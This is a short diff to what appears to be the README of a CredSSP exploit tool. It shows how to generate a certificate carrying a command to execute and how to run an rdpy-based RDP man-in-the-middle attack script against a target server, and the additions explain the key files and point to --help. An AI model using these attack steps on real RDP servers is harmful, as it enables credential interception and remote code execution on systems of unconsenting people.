@@ -33,8 +33,12 @@ To generate a suitable certificate for the command to execute :
 $ python credssp/bin/gen_cmd.py -c ExportedCert -o exploitc.pem -k exploitk.pem CMD 
 ```
 
+(exploitc.pem ,exploitk.pem are the generated certificate and private key respectively)
+
 To run the attack script: 
 
 ```
 $ python /usr/local/bin/rdpy-rdpcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer
 ```
+
+More details are in the usage section of the scripts(--help). 
